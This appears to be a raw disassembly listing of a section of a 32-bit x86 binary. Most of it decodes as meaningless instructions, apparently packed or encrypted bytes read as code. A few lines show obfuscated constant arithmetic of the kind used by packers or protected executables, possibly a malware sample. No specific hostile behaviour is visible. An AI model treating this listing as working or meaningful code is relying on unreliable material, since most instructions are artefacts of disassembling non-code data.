  40d3db:	or     DWORD PTR [esi],edi
  40d3dd:	cli    
  40d3de:	inc    edi
  40d3df:	lods   al,BYTE PTR ds:[esi]
  40d3e0:	adc    eax,0x23cc3984
  40d3e5:	xchg   edx,eax
  40d3e6:	int    0xc4
  40d3e8:	jae    0x40d3b7
  40d3ea:	aad    0x31
  40d3ec:	or     esi,DWORD PTR [edx+0x1d]
  40d3ef:	adc    DWORD PTR [esi+0x74],eax
  40d3f2:	sar    esp,0x1a
  40d3f5:	and    ch,dl
  40d3f7:	cs (bad) 
  40d3fa:	pop    ds
  40d3fb:	xchg   edi,eax
  40d3fc:	mov    DWORD PTR [eax+0x33e19c0f],ebx
  40d402:	repnz int3 
  40d404:	scas   eax,DWORD PTR es:[edi]
  40d405:	cmp    BYTE PTR ds:[eax],bl
  40d408:	lods   al,BYTE PTR ds:[esi]
  40d409:	push   esp
  40d40a:	mov    ecx,0x6d3941b2
  40d40f:	adc    eax,0xf3f2c224
  40d414:	xor    al,0x5a
  40d416:	and    BYTE PTR [esp+edi*1],bh
  40d419:	push   si
  40d41b:	lock jmp 0x7d01:0x6fe46ac
  40d423:	fldenv [ebx+0x6f11b4a5]
  40d429:	std    
  40d42a:	dec    esp
  40d42b:	adc    eax,0x5cb79fb3
  40d430:	in     eax,dx
  40d431:	dec    ebp
  40d432:	int3   
  40d433:	xor    eax,0x5ce77dd7
  40d438:	shl    DWORD PTR [esi-0x31b32889],0xa2
  40d43f:	(bad)  [ebp-0x6285f810]
  40d445:	and    al,0xe7
  40d447:	cld    
  40d448:	sub    eax,0x3735031
  40d44d:	push   ss
  40d44e:	mov    cl,0x55
  40d450:	adc    al,0x6c
  40d452:	pop    eax
  40d453:	and    ebp,DWORD PTR [ecx-0x1d]
  40d456:	jns    0x40d3fa
  40d458:	test   DWORD PTR [edx+0x41],ebx
  40d45b:	fs jge 0x40d429
  40d45e:	jl     0x40d3fe
  40d460:	add    BYTE PTR [esi+edi*4+0x1f],al
  40d464:	call   0x2b7d6cb3
  40d469:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d46a:	add    eax,0xa76beaee
  40d46f:	mov    ecx,0x9d49aea5
  40d474:	and    ah,BYTE PTR [ecx-0x7de879a7]
  40d47a:	loop   0x40d436
  40d47c:	add    eax,0x1e54895b
  40d481:	mov    edi,0xedb3b2fc
  40d486:	mov    eax,0x1f4e663d
  40d48b:	and    eax,esp
  40d48d:	push   es
  40d48e:	add    edx,DWORD PTR [edx-0x73a9d3dc]
  40d494:	fs out 0xd1,eax
  40d497:	mov    dh,0xd7
  40d499:	ffreep st(3)
  40d49b:	xor    esp,ebp
  40d49d:	jl     0x40d51c
  40d49f:	fisubr DWORD PTR [ebp+edx*2-0x596ab2fd]
  40d4a6:	retf   
  40d4a7:	add    eax,0x4f4dff9d
  40d4ac:	cwde   
  40d4ad:	pop    ds
  40d4ae:	sbb    edi,DWORD PTR [ecx+0x46847a93]
  40d4b4:	add    bh,BYTE PTR [edi+ecx*8]
  40d4b7:	loopne 0x40d50d
  40d4b9:	xchg   esp,eax
  40d4ba:	sub    eax,0xf8702612
  40d4bf:	fwait
  40d4c0:	ss scas eax,DWORD PTR es:[edi]
  40d4c2:	int3   
  40d4c3:	fs mov ebp,0x7f5bcce
  40d4c9:	je     0x40d47a
  40d4cb:	xor    ch,BYTE PTR [ebp-0x2564da43]
  40d4d1:	retf   0xb7d3
  40d4d4:	push   esp
  40d4d5:	xlat   BYTE PTR ds:[ebx]
  40d4d6:	leave  
  40d4d7:	push   es
  40d4d8:	xor    al,0x38
  40d4da:	jb     0x40d4cc
  40d4dc:	push   ebp
  40d4dd:	pusha  
  40d4de:	jge    0x40d46d
  40d4e0:	or     DWORD PTR [ebp-0x7e],ebp
  40d4e3:	call   0x1979:0xd1902885
  40d4ea:	sub    cl,BYTE PTR [ecx-0x6201e0fe]
  40d4f0:	ret    
  40d4f1:	sub    al,0x1a
  40d4f3:	add    eax,0xfdfd3f4e
  40d4f8:	jb     0x40d514
  40d4fa:	ficomp WORD PTR [eax]
  40d4fc:	ret    0x6352
  40d4ff:	pusha  
  40d500:	xlat   BYTE PTR ds:[ebx]
  40d501:	into   
  40d502:	sbb    cl,al
  40d504:	in     al,dx
  40d505:	sbb    esp,DWORD PTR [edi-0x20]
  40d508:	bound  ebp,QWORD PTR [esi+0x4e]
  40d50b:	push   ecx
  40d50c:	inc    edx
  40d50d:	cmp    eax,0xe485b913
  40d512:	pop    eax
  40d513:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d514:	add    ebp,DWORD PTR [esi-0x52415f20]
  40d51a:	cld    
  40d51b:	(bad)  
  40d51c:	xor    BYTE PTR [edx+0x2852840f],ch
  40d522:	ror    DWORD PTR [ecx],0xe4
  40d525:	push   eax
  40d526:	adc    DWORD PTR [edx+esi*4],ebp
  40d529:	mov    eax,0x908b7bab
  40d52e:	dec    ecx
  40d52f:	mov    eax,0x277da7c5
  40d534:	(bad)  [ebx]
  40d536:	pop    es
  40d537:	ror    DWORD PTR [ecx],cl
  40d539:	leave  
  40d53a:	scas   al,BYTE PTR es:[edi]
  40d53b:	cmp    DWORD PTR [eax+0x30b2acab],ebx
  40d541:	xor    DWORD PTR ss:[ebp-0x56],ebp
  40d545:	pop    esp
  40d546:	leave  
  40d547:	fstp   DWORD PTR [ecx+eax*1-0x14a620b6]
  40d54e:	lods   al,BYTE PTR ds:[esi]
  40d54f:	(bad)  
  40d550:	pop    ebx
  40d551:	gs dec ebx
  40d553:	and    eax,0xad8122b5
  40d558:	adc    BYTE PTR [eax-0x2b],bh
  40d55b:	enter  0x918c,0x67
  40d55f:	pop    es
  40d560:	and    BYTE PTR [ecx+eiz*2+0x7],0x55
  40d565:	pusha  
  40d566:	mov    cl,0x93
  40d568:	lods   al,BYTE PTR ds:[esi]
  40d569:	cmp    al,ch
  40d56b:	xchg   ebp,eax
  40d56c:	rol    DWORD PTR [edx+0x5e514bd5],cl
  40d572:	adc    eax,DWORD PTR [edx]
  40d574:	mov    ebx,DWORD PTR [edi]
  40d576:	sbb    BYTE PTR [eax],dh
  40d578:	repnz rcr ebp,cl
  40d57b:	adc    ebx,DWORD PTR [ebx]
  40d57d:	ror    BYTE PTR [esi],1
  40d57f:	or     esi,ecx
  40d581:	sbb    BYTE PTR [edi-0x52],ah
  40d584:	jl     0x40d563
  40d586:	jns    0x40d565
  40d588:	inc    esp
  40d589:	cmp    eax,0x3c5e51e7
  40d58e:	push   eax
  40d58f:	and    al,0xf2
  40d591:	addr16 xor eax,0x6f046b59
  40d597:	sub    eax,0x8b693a38
  40d59c:	nop
  40d59d:	in     eax,0x3e
  40d59f:	add    eax,0x3a6f4a65
  40d5a4:	imul   ebp,DWORD PTR [esi+edi*8],0x23
  40d5a8:	leave  
  40d5a9:	pop    esi
  40d5aa:	or     edi,edx
  40d5ac:	ficom  DWORD PTR [ebp-0x4f]
  40d5af:	add    BYTE PTR [eax+ecx*1+0x20],cl
  40d5b3:	scas   al,BYTE PTR es:[edi]
  40d5b4:	cmp    BYTE PTR [edi+ebx*2-0xe8ad25d],ah
  40d5bb:	and    eax,0xfa837769
  40d5c0:	push   es
  40d5c1:	stos   BYTE PTR es:[edi],al
  40d5c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d5c3:	xchg   ebx,eax
  40d5c4:	(bad)  
  40d5c6:	jg     0x40d60b
  40d5c8:	pop    edx
  40d5c9:	mov    BYTE PTR [esi],dl
  40d5cb:	push   esp
  40d5cc:	add    al,BYTE PTR [eax]
  40d5ce:	mov    BYTE PTR [ecx+edi*2+0x54],0xa1
  40d5d3:	popa   
  40d5d4:	retf   0x1ca9
  40d5d7:	pop    ecx
  40d5d8:	xchg   edx,eax
  40d5d9:	mov    ecx,0x24a310b
  40d5de:	dec    esi
  40d5df:	imul   eax,DWORD PTR [edx]
  40d5e2:	mov    edx,DWORD PTR [ebp-0x4]
  40d5e5:	xor    edx,ecx
  40d5e7:	mov    ecx,DWORD PTR [ebp+0x8]
  40d5ea:	lea    ecx,[edx+ecx*1+0x32729b]
  40d5f1:	cmp    ecx,eax
  40d5f3:	je     0x40dfca
  40d5f9:	mov    edi,DWORD PTR [ebp-0x18]
  40d5fc:	mov    eax,DWORD PTR [ebp+0x8]
  40d5ff:	mov    edx,DWORD PTR [ebp+0x14]
  40d602:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40d606:	mov    ecx,0x7510854
  40d60b:	xor    edx,edx
  40d60d:	xor    edi,ecx
  40d60f:	mov    esi,0x32729b
  40d614:	add    edi,esi
  40d616:	div    edi
  40d618:	mov    edx,DWORD PTR [ebp-0x4]
  40d61b:	jmp    0x40d93b
  40d620:	inc    ecx
  40d621:	stos   BYTE PTR es:[edi],al
  40d622:	push   ss
  40d623:	jmp    0x40d61a
  40d625:	jae    0x40d688
  40d627:	mov    al,0xbf
  40d629:	jo     0x40d5c5
  40d62b:	jecxz  0x40d673
  40d62d:	pop    ds
  40d62e:	mov    ecx,0x7e902bee
  40d633:	jle    0x40d6b2
  40d635:	jge    0x40d6b5
  40d637:	jle    0x40d5fa
  40d639:	xchg   ebx,eax
  40d63a:	int3   
  40d63b:	jl     0x40d636
  40d63d:	fs mov ecx,0x5b14f1ee
  40d643:	pop    esi
  40d644:	add    BYTE PTR ds:0x98bf45bf,cl
  40d64a:	(bad)  
  40d64b:	pop    eax
  40d64c:	je     0x40d691
  40d64e:	push   es
  40d64f:	dec    ebx
  40d650:	(bad)  [esi+0x59]
  40d653:	sub    DWORD PTR [edx+0x3d],esp
  40d656:	adc    eax,0xad7fcba9
  40d65b:	into   
  40d65c:	adc    edx,DWORD PTR [eax]
  40d65e:	cdq    
  40d65f:	mov    dh,BYTE PTR [edi+0x7ee56b5]
  40d665:	scas   eax,DWORD PTR es:[edi]
  40d666:	pop    ebp
  40d667:	mov    ds:0x5098c97a,al
  40d66c:	mov    ah,0x79
  40d66e:	dec    esi
  40d66f:	icebp  
  40d670:	int3   
  40d671:	push   ds
  40d672:	sbb    ch,dl
  40d674:	dec    eax
  40d675:	fsubr  QWORD PTR [ecx]
  40d677:	rcl    DWORD PTR [eax-0x76],1
  40d67a:	jecxz  0x40d676
  40d67c:	jg     0x40d691
  40d67e:	mov    cl,0x22
  40d680:	jp     0x40d65e
  40d682:	sti    
  40d683:	sbb    ecx,DWORD PTR [ecx+0x26500fe4]
  40d689:	xlat   BYTE PTR ds:[ebx]
  40d68a:	js     0x40d6ee
  40d68c:	les    ebx,FWORD PTR [esi-0x784a3fae]
  40d692:	adc    ecx,DWORD PTR [esi-0x77]
  40d695:	mov    esi,DWORD PTR [esi-0x2c]
  40d698:	sub    ah,BYTE PTR [edi+0x15]
  40d69b:	push   edx
  40d69c:	inc    ebp
  40d69d:	jecxz  0x40d648
  40d69f:	sti    
  40d6a0:	sub    eax,0xb421120a
  40d6a5:	or     BYTE PTR [ebx-0x19],bl
  40d6a8:	push   0xffffffbb
  40d6aa:	inc    ecx
  40d6ab:	jno    0x40d641
  40d6ad:	call   0xe975:0x17169324
  40d6b4:	inc    eax
  40d6b5:	arpl   WORD PTR [edi+0x4e9040bc],di
  40d6bb:	mov    dl,0x90
  40d6bd:	add    edi,esi
  40d6bf:	fld    QWORD PTR [eax-0x31]
  40d6c2:	inc    edi
  40d6c3:	and    DWORD PTR [ebx+ebx*8-0x1304676e],ecx
  40d6ca:	cld    
  40d6cb:	mov    ds:0xf269c7bf,eax
  40d6d0:	invd   
  40d6d2:	loopne 0x40d734
  40d6d4:	mov    al,0x3
  40d6d6:	nop
  40d6d7:	xchg   ebp,eax
  40d6d8:	jns    0x40d6f9
  40d6da:	loop   0x40d6a5
  40d6dc:	inc    ebx
  40d6dd:	nop
  40d6de:	cli    
  40d6df:	mov    eax,0x3bbfdf87
  40d6e4:	into   
  40d6e5:	addr16 xchg esp,eax
  40d6e7:	call   0x4b96:0xac48c50e
  40d6ee:	stos   BYTE PTR es:[edi],al
  40d6ef:	mov    ebp,?
  40d6f1:	push   ds
  40d6f2:	adc    ah,0x41
  40d6f5:	ret    0x7ad2
  40d6f8:	dec    esp
  40d6f9:	sub    BYTE PTR [ecx-0x2788c6a7],ch
  40d6ff:	dec    ebx
  40d700:	aas    
  40d701:	jns    0x40d6eb
  40d703:	aam    0x31
  40d705:	cli    
  40d706:	ror    DWORD PTR cs:[eax],cl
  40d709:	sbb    al,dh
  40d70b:	cmp    DWORD PTR [edi-0x5658006f],esp
  40d711:	push   ecx
  40d712:	mov    ds,WORD PTR [ecx]
  40d714:	pop    ebx
  40d715:	lock inc ebx
  40d717:	retf   0x5ada
  40d71a:	and    cl,bl
  40d71c:	in     al,0xca
  40d71e:	and    DWORD PTR [esp+eax*8],esp
  40d721:	dec    ebx
  40d722:	nop
  40d723:	xchg   BYTE PTR [edx],dh
  40d725:	and    al,0x7a
  40d727:	and    DWORD PTR [ecx+0x3b],esi
  40d72a:	ds pushf 
  40d72c:	popf   
  40d72d:	jg     0x40d710
  40d72f:	sbb    DWORD PTR [ebx+0x5c],eax
  40d732:	push   ss
  40d733:	and    eax,0xc15c0bf9
  40d738:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d739:	inc    esp
  40d73a:	xor    al,0x75
  40d73c:	inc    esp
  40d73d:	(bad)  
  40d73e:	lods   al,BYTE PTR ds:[esi]
  40d73f:	mov    edx,0x1b2cc7d1
  40d744:	or     ah,BYTE PTR [ebx+0x10babd66]
  40d74a:	test   eax,0x89c71366
  40d74f:	dec    edx
  40d750:	cmp    DWORD PTR [edx+edi*2+0x50ac5f52],ebx
  40d757:	(bad)  
  40d758:	popa   
  40d759:	inc    esp
  40d75a:	or     eax,0xb98ea872
  40d75f:	ret    
  40d760:	ja     0x40d73d
  40d762:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d763:	mov    WORD PTR [ebp+0x6a],ss
  40d766:	call   0x8985f75e
  40d76b:	das    
  40d76c:	scas   al,BYTE PTR es:[edi]
  40d76d:	fisubr WORD PTR [edi]
  40d76f:	sub    esp,DWORD PTR [ecx+0x68a09728]
  40d775:	xchg   esp,eax
  40d776:	sub    DWORD PTR [eax],edi
  40d778:	push   edx
  40d779:	add    al,0x88
  40d77b:	mov    BYTE PTR [edx+ebx*2],dl
  40d77e:	ret    
  40d77f:	es dec edx
  40d781:	push   esp
  40d782:	cmp    al,0x70
  40d784:	fisub  DWORD PTR [ecx+0x50]
  40d787:	xor    al,0xbd
  40d789:	scas   al,BYTE PTR es:[edi]
  40d78a:	jle    0x40d804
  40d78c:	(bad)  
  40d78d:	pop    eax
  40d78e:	inc    eax
  40d78f:	mul    DWORD PTR [edx-0x6f68442b]
  40d795:	das    
  40d796:	dec    ecx
  40d797:	nop
  40d798:	pop    esp
  40d799:	leave  
  40d79a:	ins    DWORD PTR es:[edi],dx
  40d79b:	push   0x84338310
  40d7a0:	sbb    edx,DWORD PTR [edi+eax*2-0x457d9e13]
  40d7a7:	sbb    ch,BYTE PTR [esi]
  40d7a9:	loopne 0x40d820
  40d7ab:	cs xchg esi,eax
  40d7ad:	cwde   
  40d7ae:	jbe    0x40d739
  40d7b0:	jae    0x40d754
  40d7b2:	add    dl,BYTE PTR [eax]
  40d7b4:	int    0x65
  40d7b6:	aad    0xb3
  40d7b8:	icebp  
  40d7b9:	mov    al,0x37
  40d7bb:	sti    
  40d7bc:	nop
  40d7bd:	sahf   
  40d7be:	adc    dh,bl
  40d7c0:	(bad)  
  40d7c1:	int3   
  40d7c2:	test   eax,0x187b2ca9
  40d7c7:	mov    ch,BYTE PTR [edx+0x4047a0b8]
  40d7cd:	sub    DWORD PTR [ebx-0x3b],edx
  40d7d0:	cli    
  40d7d1:	popa   
  40d7d2:	ss (bad) 
  40d7d4:	mov    ch,0xb
  40d7d6:	in     eax,0xb8
  40d7d8:	add    eax,0x74203a48
  40d7dd:	into   
  40d7de:	pop    ss
  40d7df:	pop    edx
  40d7e0:	mov    dl,0xba
  40d7e2:	call   0x72b7:0x5f0421ea
  40d7e9:	add    edx,DWORD PTR [ebx-0x4b9bac2a]
  40d7ef:	lods   al,BYTE PTR ds:[esi]
  40d7f0:	jmp    0xb45c:0x9e7577d5
  40d7f7:	mov    dh,0xa3
  40d7f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d7fa:	imul   eax,edi,0x1c
  40d7fd:	mov    ah,0x19
  40d7ff:	jo     0x40d788
  40d801:	sub    al,0x4d
  40d803:	xchg   DWORD PTR [ecx-0x2f48d93b],eax
  40d809:	xor    DWORD PTR [esi-0x760f85],eax
  40d80f:	loopne 0x40d807
  40d811:	mov    ch,0xa8
  40d813:	xchg   ebp,eax
  40d814:	push   es
  40d815:	dec    edx
  40d816:	mov    edx,0x58ddef0
  40d81b:	adc    BYTE PTR [edi+edx*2],ah
  40d81e:	or     cl,BYTE PTR [ebx]
  40d820:	xor    ah,ch
  40d822:	sbb    bl,BYTE PTR [ebp-0x32]
  40d825:	dec    esp
  40d826:	ret    0x539d
  40d829:	std    
  40d82a:	jecxz  0x40d7da
  40d82c:	nop
  40d82d:	jno    0x40d883
  40d82f:	adc    DWORD PTR [eax-0x4f],0xffffffb3
  40d833:	push   0xffffffb3
  40d835:	sbb    BYTE PTR [edi+0x6],ah
  40d838:	inc    edi
  40d839:	jecxz  0x40d86a
  40d83b:	adc    eax,0xede3f271
  40d840:	sbb    cl,ch
  40d842:	sub    dl,BYTE PTR [ecx-0x9]
  40d845:	fnsave [esi-0x45]
  40d848:	aas    
  40d849:	push   edi
  40d84a:	pop    edx
  40d84b:	popa   
  40d84c:	aas    
  40d84d:	stc    
  40d84e:	hlt    
  40d84f:	inc    ecx
  40d850:	call   0x85e3bc8e
  40d855:	repnz dec edx
  40d858:	enter  0xafd9,0x3f
  40d85c:	aam    0xe2
  40d85e:	mov    dl,0x1d
  40d860:	into   
  40d861:	push   eax
  40d862:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d863:	icebp  
  40d864:	sub    DWORD PTR [eax],edi
  40d866:	lods   eax,DWORD PTR ds:[esi]
  40d867:	ret    
  40d868:	pusha  
  40d869:	adc    eax,0xa055f2f7
  40d86e:	lea    ebp,[ebx+0x66cf118d]
  40d874:	je     0x40d8da
  40d876:	je     0x40d84b
  40d878:	or     eax,0x151e27a5
  40d87d:	loop   0x40d890
  40d87f:	jb     0x40d8b3
  40d881:	xor    al,0x58
  40d883:	mov    bl,0x47
  40d885:	sbb    eax,0xcc88e726
  40d88a:	out    dx,eax
  40d88b:	fnstsw WORD PTR [eax]
  40d88d:	pop    edx
  40d88e:	xor    al,0x84
  40d890:	xor    dl,BYTE PTR ds:[esi]
  40d893:	and    dh,BYTE PTR [eax+0x7]
  40d896:	sub    bh,BYTE PTR [ebx]
  40d898:	dec    ebp
  40d899:	xchg   edi,eax
  40d89a:	mov    bh,0xc
  40d89c:	div    BYTE PTR [eax]
  40d89e:	jns    0x40d897
  40d8a0:	imul   esi,DWORD PTR [ecx+0xf],0x70
  40d8a4:	pop    ecx
  40d8a5:	std    
  40d8a6:	and    ebx,DWORD PTR [ebp+0x7b]
  40d8a9:	popa   
  40d8aa:	loopne 0x40d921
  40d8ac:	jmp    0x8414:0x981256ca
  40d8b3:	mov    ebx,0x57249a77
  40d8b8:	mov    cl,0x1f
  40d8ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d8bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d8bc:	and    dh,BYTE PTR [edx+ecx*1+0x5ca19a88]
  40d8c3:	dec    edi
  40d8c4:	repnz bound esi,QWORD PTR [ebp+0x2d]
  40d8c8:	push   eax
  40d8c9:	stos   DWORD PTR es:[edi],eax
  40d8ca:	jle    0x40d875
  40d8cc:	jmp    0x40d8b9
  40d8ce:	dec    esi
  40d8cf:	fwait
  40d8d0:	test   al,0x68
  40d8d2:	and    al,0x46
  40d8d4:	sbb    al,0xd6
  40d8d6:	push   ebx
  40d8d7:	push   0x72
  40d8d9:	clc    
  40d8da:	or     BYTE PTR ds:0x8cad72ce,dl
  40d8e0:	pop    edx
  40d8e1:	or     eax,0x858a197a
  40d8e6:	(bad)  
  40d8e7:	dec    edi
  40d8e8:	or     eax,0x4e427e99
  40d8ed:	fbld   TBYTE PTR [ebp+edi*8+0x5]
  40d8f1:	and    al,0x4
  40d8f3:	inc    edi
  40d8f4:	xor    DWORD PTR [ecx-0x6e44600f],esp
  40d8fa:	mov    bl,0xbd
  40d8fc:	jbe    0x40d96f
  40d8fe:	or     al,0xd1
  40d900:	loopne 0x40d96a
  40d902:	pusha  
  40d903:	xlat   BYTE PTR ds:[ebx]
  40d904:	cmp    eax,0xd95f40f5
  40d909:	fs je  0x40d935
  40d90c:	inc    edi
  40d90d:	call   DWORD PTR [ebx-0x70bd3601]
  40d913:	data16 jecxz 0x40d962
  40d916:	das    
  40d917:	pop    ebp
  40d918:	sub    DWORD PTR [edx+0x3a],esi
  40d91b:	idiv   BYTE PTR [esi-0x6e3d5fe9]
  40d921:	aaa    
  40d922:	popf   
  40d923:	shl    BYTE PTR [ebx-0x7ab44a2b],1
  40d929:	xchg   esp,eax
  40d92a:	add    edx,DWORD PTR [ecx]
  40d92c:	sub    edi,DWORD PTR [edi-0x42]
  40d92f:	aas    
  40d930:	or     BYTE PTR [ecx],bl
  40d932:	xchg   DWORD PTR [edi],ebp
  40d934:	jecxz  0x40d97d
  40d936:	or     al,0x48
  40d938:	inc    ebx
  40d939:	daa    
  40d93a:	shl    DWORD PTR [ebx],0xd1
  40d93d:	lea    eax,[edx+eax*1+0x32729b]
  40d944:	jmp    0x40dc64
  40d949:	das    
  40d94a:	sub    BYTE PTR [ecx],0x25
  40d94d:	mov    cl,0xb5
  40d94f:	xor    edx,DWORD PTR [eax-0x2c802913]
  40d955:	mov    ah,0x8e
  40d957:	shl    ch,cl
  40d959:	ss lahf 
  40d95b:	jle    0x40d9db
  40d95d:	jge    0x40d9dc
  40d95f:	jle    0x40d9df
  40d961:	aaa    
  40d962:	shl    DWORD PTR [ebp+0x3df8b93],0xba
  40d969:	mov    eax,0xc34cdd08
  40d96e:	xchg   edi,eax
  40d96f:	cmp    al,0x71
  40d972:	cli    
  40d973:	leave  
  40d974:	scas   al,BYTE PTR es:[edi]
  40d975:	and    BYTE PTR [edi],ch
  40d977:	daa    
  40d978:	push   esp
  40d979:	inc    eax
  40d97a:	push   esp
  40d97b:	pusha  
  40d97c:	imul   ebp,esp,0x3846e335
  40d982:	shl    dl,1
  40d984:	pushf  
  40d985:	int3   
  40d986:	dec    esp
  40d987:	rsqrtps xmm2,XMMWORD PTR [ebx-0x8]
  40d98b:	mov    ah,0x6c
  40d98d:	cmp    BYTE PTR [edx],dl
  40d98f:	out    0x14,eax
  40d991:	hlt    
  40d992:	test   BYTE PTR ds:0x81790b86,0xf4
  40d999:	mov    dh,bh
  40d99b:	shl    BYTE PTR [esi+0x42db3971],0x6a
  40d9a2:	push   cs
  40d9a3:	adc    esi,DWORD PTR [eax+edx*4+0x47]
  40d9a7:	pop    ebx
  40d9a8:	das    
  40d9a9:	fiadd  DWORD PTR [ecx]
  40d9ab:	ja     0x40d99b
  40d9ad:	aas    
  40d9ae:	ins    BYTE PTR es:[edi],dx
  40d9af:	test   BYTE PTR [eax],0x3e
  40d9b2:	out    dx,ax
  40d9b4:	push   esp
  40d9b5:	imul   esi,DWORD PTR ds:0x54ef9b92,0xffffffbf
  40d9bc:	and    ah,BYTE PTR [ecx-0x44a3efab]
  40d9c2:	fnstenv [ebx]
  40d9c4:	jge    0x40d9e8
  40d9c6:	js     0x40d996
  40d9c8:	lea    ebp,[ebp-0x78f2c1b9]
  40d9ce:	sti    
  40d9cf:	jb     0x40d951
  40d9d1:	pushf  
  40d9d2:	sub    ah,dh
  40d9d4:	out    dx,eax
  40d9d5:	sub    DWORD PTR [edi+eax*4+0x1],esp
  40d9d9:	rcr    DWORD PTR [edi+0x79],cl
  40d9dc:	xchg   ebx,eax
  40d9dd:	in     eax,0xa8
  40d9df:	repz xchg edx,eax
  40d9e1:	fwait
  40d9e2:	push   esp
  40d9e3:	out    0x20,eax
  40d9e5:	gs shl cl,cl
  40d9e8:	jb     0x40da21
  40d9ea:	(bad)  
  40d9eb:	or     edi,DWORD PTR [edx+0x38]
  40d9ee:	pop    edx
  40d9ef:	out    dx,eax
  40d9f0:	out    dx,eax
  40d9f1:	inc    esp
  40d9f2:	and    al,BYTE PTR [edx+0x34d3e9f4]
  40d9f8:	and    DWORD PTR [edx],0xaf70fcdb
  40d9fe:	push   ecx
  40d9ff:	fmul   DWORD PTR [ecx+0x38ce96bb]
  40da05:	xchg   ecx,eax
  40da06:	mov    esi,esp
  40da08:	nop
  40da09:	mov    eax,0xc1268bba
  40da0e:	add    dh,ah
  40da10:	call   0xa3ca3329
  40da15:	pop    esi
  40da16:	jno    0x40da3b
  40da18:	jns    0x40d9fd
  40da1a:	pop    esp
  40da1b:	sub    BYTE PTR [eax-0x244553f4],0x57
  40da22:	stos   BYTE PTR es:[edi],al
  40da23:	and    esi,esp
  40da25:	mov    ecx,0x3b5b433d
  40da2a:	pop    ebx
  40da2b:	or     eax,0x3b88c856
  40da30:	fisub  DWORD PTR [edx+edi*2-0x38]
  40da34:	inc    esi
  40da35:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40da36:	mov    dh,0xf8
  40da38:	xlat   BYTE PTR ds:[ebx]
  40da39:	(bad)  
  40da3a:	std    
  40da3b:	xor    eax,0x35cd89f7
  40da40:	pop    edi
  40da41:	idiv   DWORD PTR [eax+0x10]
  40da44:	mov    DWORD PTR [ebp-0x34ef914c],ebp
  40da4a:	cmp    DWORD PTR [edx+esi*8-0x70],edx
  40da4e:	jo     0x40daad
  40da50:	or     BYTE PTR [edx+eiz*1],0xa2
  40da54:	dec    esi
  40da55:	cmp    eax,0x2609efc2
  40da5a:	retf   0x319b
  40da5d:	jmp    0x40da8b
  40da5f:	das    
  40da60:	jl     0x40da97
  40da62:	shl    BYTE PTR ds:0xe03ca1d6,cl
  40da68:	and    BYTE PTR gs:[esi],ch
  40da6b:	sbb    BYTE PTR [esi-0x6a495901],dh
  40da71:	bound  esp,QWORD PTR [esi+edi*1]
  40da74:	test   BYTE PTR [edi+0x6b],0xcb
  40da78:	stos   BYTE PTR es:[edi],al
  40da79:	gs iret 
  40da7b:	data16 jne 0x40dac1
  40da7e:	ss mov ch,0xdf
  40da81:	jb     0x40dad1
  40da83:	call   0x33fa207f
  40da88:	pop    es
  40da89:	adc    DWORD PTR [eax+0x3],eax
  40da8c:	imul   edi,DWORD PTR [ebx],0xffffffa7
  40da8f:	inc    esi
  40da90:	(bad)  
  40da91:	aad    0x83
  40da93:	in     al,0xe4
  40da95:	mov    ebp,0xb20c242b
  40da9a:	push   ds
  40da9b:	dec    eax
  40da9c:	jae    0x40da5e
  40da9e:	int    0x2d
  40daa0:	xlat   BYTE PTR ds:[ebx]
  40daa1:	inc    ecx
  40daa2:	pop    edi
  40daa3:	jge    0x40da25
  40daa5:	aaa    
  40daa6:	mov    ch,0x9
  40daa8:	loopne 0x40da5e
  40daaa:	icebp  
  40daab:	ret    
  40daac:	call   0xbbd90082
  40dab1:	mov    al,0x5d
  40dab3:	fisttp QWORD PTR [ecx]
  40dab5:	cli    
  40dab6:	in     eax,dx
  40dab7:	sbb    DWORD PTR [ebx],edi
  40dab9:	loop   0x40da9d
  40dabb:	jb     0x40dab6
  40dabd:	sub    DWORD PTR [edx+0x75],0x34e72fac
  40dac4:	aad    0xad
  40dac6:	xor    BYTE PTR [esp+eiz*2+0x11],dl
  40daca:	cmp    eax,0x8fe812f9
  40dacf:	add    BYTE PTR [eax+0x799312a1],dh
  40dad5:	lahf   
  40dad6:	(bad)  
  40dad7:	(bad)  
  40dad8:	jne    0x40daa9
  40dada:	xchg   edi,eax
  40dadb:	enter  0xff26,0x48
  40dadf:	iret   
  40dae0:	or     BYTE PTR [ecx-0x62],al
  40dae3:	mov    eax,ds:0x9deebf20
  40dae8:	adc    eax,0x588f02e2
  40daed:	add    ah,BYTE PTR [eax+0x69]
  40daf0:	cli    
  40daf1:	ret    0x4091
  40daf4:	and    DWORD PTR [edi+0x2b],ecx
  40daf7:	in     eax,dx
  40daf8:	mov    ds:0xfe864c2e,al
  40dafd:	sbb    BYTE PTR [ebp-0x28836015],ch
  40db03:	out    0x9d,al
  40db05:	pop    ebx
  40db06:	les    ebp,FWORD PTR [ecx-0x1d]
  40db09:	xchg   esi,eax
  40db0a:	fadd   DWORD PTR [esi+0x11]
  40db0d:	mov    esi,0xc55b5a7
  40db12:	pop    esp
  40db13:	into   
  40db14:	and    edx,esp
  40db16:	mov    ds:0xa8df18f6,eax
  40db1b:	enter  0x5c95,0xc
  40db1f:	xchg   edi,eax
  40db20:	js     0x40dae2
  40db22:	ret    
  40db23:	push   0xd64cb01f
  40db28:	lock pusha 
  40db2a:	gs jns 0x40daae
  40db2d:	lds    esi,FWORD PTR [ecx-0x37]
  40db30:	jbe    0x40db31
  40db32:	push   edx
  40db33:	jmp    0x1254:0xb10cb929
  40db3a:	nop    DWORD PTR ds:0x736f2fe4
  40db41:	sbb    ecx,DWORD PTR [edi+0x2e]
  40db44:	jno    0x40dbac
  40db46:	sbb    al,0x9b
  40db48:	icebp  
  40db49:	mov    ebx,0xaed0baa2
  40db4e:	pushf  
  40db4f:	adc    esp,edi
  40db51:	sub    al,0xbe
  40db53:	inc    edx
  40db54:	test   eax,0xe4550379
  40db59:	std    
  40db5a:	ret    
  40db5b:	ret    0x9259
  40db5e:	mul    DWORD PTR [ecx+0x1af95f5a]
